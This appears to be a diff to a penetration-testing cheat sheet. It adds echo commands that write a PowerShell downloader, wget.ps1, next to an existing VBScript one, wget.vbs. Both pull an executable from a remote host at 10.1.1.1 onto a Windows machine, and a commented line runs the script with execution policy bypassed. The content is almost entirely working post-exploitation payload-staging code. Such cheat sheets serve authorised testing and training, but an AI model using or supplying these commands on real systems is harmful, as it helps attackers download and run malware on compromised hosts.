@@ -25,3 +25,12 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 echo rem Once wget.vbs is created run it like below  >> wget.vbs
 echo rem cscript wget.vbs http://10.1.1.1/download.exe dnload.exe >> wget.vbs
+
+
+
+echo $storageDir = $pwd > wget.ps1
+echo $WebClient = New-Object System.Net.WebClient >> wget.ps1
+echo $url = "http://10.1.1.1:8000/dnload.exe" >> wget.ps1
+echo $file = "mydnload.exe" >> wget.ps1
+echo $WebClient.DownloadFile($url, $file) >> wget.ps1
+echo # powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 >> wget.ps1
